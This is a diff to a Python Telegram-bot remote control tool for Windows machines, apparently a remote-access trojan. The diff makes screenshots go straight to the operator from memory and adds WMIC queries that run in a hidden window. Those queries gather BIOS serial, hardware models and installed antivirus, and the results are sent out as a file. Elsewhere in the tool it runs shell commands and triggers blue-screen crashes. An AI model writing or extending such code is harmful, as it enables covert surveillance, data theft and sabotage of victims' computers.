@@ -8,6 +8,9 @@ class Core:
         self.bot = telebot.TeleBot(token)
         self.ADMIN_ID = 1234567890
         self.display_pass = True
+        self.wmic_pass = True
+        self.wmic_info = None
+        self.sinfo_info = None
 
         self.text = """
         __________________________________________________________
@@ -134,16 +137,17 @@ class Core:
         self.bot.reply_to(self.ADMIN_ID, f"Команда выполнена: {cmd}\n`{stdout}`", parse_mode="Markdown")
 
     def screenshot_command(self, message):
-        import pyautogui
         if message.from_user.id != self.ADMIN_ID:
             return
 
+        import io
+        import pyautogui
+
+        buffer = io.BytesIO()
         screenshot = pyautogui.screenshot()
-        path = "screen.png"
-        screenshot.save(path)
-        with open(path, "rb") as photo:
-            self.bot.send_photo(message.chat.id, photo)
-        os.remove(path)
+        screenshot.save(buffer, format='PNG')
+        buffer.seek(0)
+        self.bot.send_photo(self.ADMIN_ID, buffer)
 
     def write_command(self, message):
         if message.from_user.id != self.ADMIN_ID:
@@ -343,16 +347,80 @@ class Core:
         else:
             self.bot.send_message(message.chat.id, "??? restart /wkill")
 
+
+    def sinfo_send(self):
+        if self.sinfo_info is not None and self.wmic_info is not None:
+            import io
+            report_text = f"{self.sinfo_info}\n\n\n{self.wmic_info}"
+            text_buffer = io.BytesIO(report_text.encode('utf-8'))
+            text_buffer.name = "system_info.txt"
+            self.bot.send_document(self.ADMIN_ID, text_buffer)
+
+
+
+    def wmic_sinfo(self, message):
+        if self.wmic_pass:
+            if message.from_user.id != self.ADMIN_ID:
+                return
+
+        import subprocess
+        def get_wmic(command):
+            try:
+                output = subprocess.check_output(f"wmic {command}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+                res = output.decode('utf-8', errors='ignore').strip()
+
+                values = []
+                for line in res.splitlines():
+                    if '=' in line:
+                        val = line.split('=', 1)[1].strip()
+                        if val: values.append(val)
+
+                return ", ".join(values) if values else "N/A"
+
+            except Exception:
+                return "Error"
+
+        self.wmic_info = (f"Serial Number: `{get_wmic("bios get serialnumber /value")}`\n"
+                     f"Disk model: `{get_wmic("diskdrive get model, InterfaceType /value")}`\n"
+                     f"Product model: `{get_wmic("csproduct get name /value")}`\n"
+                     f"Socket model: `{get_wmic("cpu get socketdesignation /value")}`\n\n"
+                     f"Display width: `{get_wmic("path win32_VideoController get CurrentHorizontalResolution /value")}`\n"
+                     f"Display height: `{get_wmic("path win32_VideoController get CurrentVerticalResolution /value")}`\n"
+                     f"Display refresh rate: `{get_wmic("path win32_VideoController get CurrentRefreshRate /value")}`\n\n"
+                     f"GPU: `{get_wmic("path win32_VideoController get name /value")}`\n"
+                     f"CPU: `{get_wmic("cpu get loadpercentage /value")}%`\n"
+                     f"MotherBoard: `{get_wmic("baseboard get product,Manufacturer /value")}`\n"
+                     f"Bios version: `{get_wmic("bios get name, releaseDate, version /value")}`\n"
+                     f"All disks: `{get_wmic("logicaldisk get caption, freespace, size /value")}`\n"
+                     f"Defender: `{get_wmic(r"/namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName, productState /value")}`\n")
+
+        self.bot.reply_to(message, self.wmic_info, parse_mode="Markdown")
+        self.sinfo_send()
+
     def sinfo_command(self, message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
+        self.wmic_pass = False
         import psutil
         import platform
 
-        self.bot.reply_to(message, f"OS: `{platform.platform()}`\nName: `{platform.node()}`\nArch: `{platform.machine()}`\nProcessor: `{platform.processor()}`\n\n"
-                              f"Python build: `{platform.python_build()}`\nCompiler: `{platform.python_compiler()}`\n"
-                              f"Python version: `{platform.python_version()}`\n\nCPU count: `{psutil.cpu_count()}`\nMemory: `{psutil.virtual_memory()}`", parse_mode="Markdown")
+
+        mem = psutil.virtual_memory()
+        b = psutil.sensors_battery()
+        self.sinfo_info = (f"OS: `{platform.platform()}`\nName: `{platform.node()}`\nArch: `{platform.machine()}`\nProcessor: `{platform.processor()}`\nCPU count: `{psutil.cpu_count()}`\n\n"
+                              f"Python build: `{platform.python_build()}`\n"
+                              f"Compiler: `{platform.python_compiler()}`\n"
+                              f"Python version: `{platform.python_version()}`\n\n"
+                              f"Memory: `{mem.percent}%`\nMemory total: `{mem.total}`\n"
+                              f"Memory used: `{mem.used}`\n"
+                              f"Free memory: `{mem.free}`\n\n"
+                              f"Battery power: `{b.power_plugged}`\n"
+                              f"Battery percent: `{b.percent}`\n")
+
+        self.bot.reply_to(message, self.sinfo_info, parse_mode="Markdown")
+
+        self.wmic_sinfo(message)
 
     def list_all_windows(self, message):
         if message.from_user.id != self.ADMIN_ID:
@@ -461,7 +529,7 @@ class Core:
             self.bot.send_message(ADMIN_ID, "pc was rebooted")
             return
 
-    def bsod_ctypes(self, message):
+    def bsod_command(self, message):
         if message.from_user.id != self.ADMIN_ID:
             return
 
@@ -478,6 +546,6 @@ class Core:
         self.bot.polling(none_stop=True)
 
 if __name__ == '__main__':
-    TOKEN = "yourtoken"
+    TOKEN = "your token"
     app = Core(TOKEN)
     app.run()
